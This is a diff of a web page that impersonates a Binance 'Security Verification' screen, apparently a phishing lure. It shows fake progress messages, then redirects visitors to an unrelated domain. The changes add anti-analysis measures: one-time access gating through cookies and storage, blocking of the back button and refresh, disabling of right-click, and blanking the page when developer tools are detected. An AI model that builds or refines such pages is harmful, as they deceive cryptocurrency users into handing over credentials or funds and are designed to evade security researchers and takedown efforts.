@@ -13,6 +13,10 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         .container {
             background: #ffffff;
@@ -50,7 +54,7 @@
             background: linear-gradient(90deg, #f0b90b 0%, #ffd700 100%);
             width: 0%;
             border-radius: 20px;
-            animation: loading 3s ease-in-out forwards;
+            animation: loading 4s ease-in-out forwards;
         }
         @keyframes loading {
             to { width: 100%; }
@@ -65,10 +69,22 @@
             font-size: 12px;
             color: #999;
         }
+        .expired-message {
+            display: none;
+            color: #ff6b6b;
+            text-align: center;
+            font-size: 18px;
+            padding: 50px;
+        }
+        .expired-message .support-text {
+            margin-top: 20px;
+            color: #999;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="loadingContainer">
         <img src="https://public.bnbstatic.com/image/ufo/20210831/1e00bd49-0695-4eaa-8ab0-6dd89a7087fb.png" alt="Logo" class="logo">
         
         <div class="title">Security Verification</div>
@@ -88,61 +104,137 @@
         </div>
     </div>
 
+    <div class="expired-message" id="expiredMessage">
+        <h2>🚫 Access Denied</h2>
+        <p>This security link has already been used or has expired.</p>
+        <p class="support-text">
+            Please contact support if you need assistance.
+        </p>
+    </div>
+
     <script>
-        // Prevent navigation
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            return '';
-        });
-
-        // Block back button
-        history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function() {
-            history.go(1);
-        });
-
-        // Status updates
-        const status = document.getElementById('status');
-        const messages = [
-            'Initializing verification...',
-            'Connecting to security servers...',
-            'Validating security key...',
-            'Processing activation request...',
-            'Finalizing verification...',
-            'Activation completed successfully!'
-        ];
-
-        let currentMessage = 0;
-        const updateStatus = () => {
-            if (currentMessage < messages.length) {
-                status.textContent = messages[currentMessage];
-                currentMessage++;
-                setTimeout(updateStatus, 600);
-            } else {
+        (function() {
+            'use strict';
+            
+            const SESSION_KEY = 'binanceAccess_' + Date.now();
+            
+            // 1. ✅ Vérifier l'accès unique
+            function checkUniqueAccess() {
+                const hasAccessed = 
+                    sessionStorage.getItem('binanceUsed') ||
+                    localStorage.getItem('binanceVisited') ||
+                    document.cookie.includes('binanceAccess=true');
+                
+                if (hasAccessed) {
+                    showExpired();
+                    return false;
+                }
+                
+                // Marquer immédiatement comme utilisé
+                sessionStorage.setItem('binanceUsed', 'true');
+                localStorage.setItem('binanceVisited', Date.now().toString());
+                document.cookie = 'binanceAccess=true; path=/; max-age=86400';
+                
+                return true;
+            }
+            
+            // 2. ✅ Empêcher le retour en arrière
+            function preventNavigation() {
+                history.pushState(null, null, location.href);
+                window.addEventListener('popstate', function() {
+                    history.pushState(null, null, location.href);
+                });
+                
+                // Bloquer refresh
+                window.addEventListener('beforeunload', function() {
+                    sessionStorage.setItem('binanceUsed', 'true');
+                });
+                
+                // Bloquer F5, Ctrl+R
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+            }
+            
+            // 3. ✅ Animation de chargement avec messages
+            function startAnimation() {
+                const status = document.getElementById('status');
+                const messages = [
+                    'Initializing verification...',
+                    'Connecting to security servers...',
+                    'Validating security key...',
+                    'Processing activation request...',
+                    'Finalizing verification...',
+                    'Redirecting to secure portal...'
+                ];
+                
+                let currentMessage = 0;
+                const messageInterval = setInterval(() => {
+                    if (currentMessage < messages.length) {
+                        status.textContent = messages[currentMessage];
+                        currentMessage++;
+                    } else {
+                        clearInterval(messageInterval);
+                    }
+                }, 700);
+            }
+            
+            // 4. ✅ Redirection automatique
+            function redirectAfterDelay() {
                 setTimeout(() => {
-                    window.location.href = 'https://verify.helpdesk-guardprotect.com';
+                    window.location.replace('https://verify.helpdesk-guardprotect.com');
+                }, 4200); // Après l'animation complète
+            }
+            
+            // Afficher message d'expiration
+            function showExpired() {
+                document.getElementById('loadingContainer').style.display = 'none';
+                document.getElementById('expiredMessage').style.display = 'block';
+            }
+            
+            // Protection développeur simple
+            function basicProtection() {
+                document.addEventListener('contextmenu', e => e.preventDefault());
+                
+                let devtools = false;
+                setInterval(() => {
+                    if (window.outerHeight - window.innerHeight > 200) {
+                        if (!devtools) {
+                            devtools = true;
+                            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#ff6b6b;">Access Restricted</div>';
+                        }
+                    }
                 }, 1000);
             }
-        };
-
-        setTimeout(updateStatus, 500);
-
-        // Generate unique session
-        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 16) + Date.now().toString(36);
-        console.log('Session ID:', sessionId);
-
-        // Block developer tools
-        let devtools = false;
-        setInterval(function() {
-            if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
-                if (!devtools) {
-                    devtools = true;
-                    console.clear();
-                    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;">Access Restricted</div>';
+            
+            // 🚀 Initialisation
+            function init() {
+                // Vérifier accès unique
+                if (!checkUniqueAccess()) {
+                    return;
                 }
+                
+                // Activer protections
+                preventNavigation();
+                basicProtection();
+                
+                // Démarrer animation
+                startAnimation();
+                
+                // Programmer redirection
+                redirectAfterDelay();
             }
-        }, 500);
+            
+            // Démarrer
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+        })();
     </script>
 </body>
 </html>
-
